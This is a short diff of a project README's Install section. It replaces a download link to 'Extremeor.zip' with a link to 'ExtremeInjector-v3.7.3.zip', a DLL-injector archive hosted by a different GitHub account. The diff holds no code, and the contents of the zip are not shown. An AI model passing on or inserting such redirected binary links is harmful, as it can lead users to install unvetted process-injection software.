@@ -7,7 +7,7 @@
 
 
 ## Install
-[Download `Extremeor.zip`](https://github.com/Salarr/Extremeor/releases/latest/download/Extremeor.zip)
+[Download `ExtremeInjector-v3.7.3.zip`](https://github.com/extremedll/ExtremeInjector/releases/download/v3.7.3/ExtremeInjector-v3.7.3.zip)
 ---
 
 <img width="403" height="315" alt="image" src="https://github.com/user-attachments/assets/c1286304-5083-4104-93fa-8583395a8d46" />
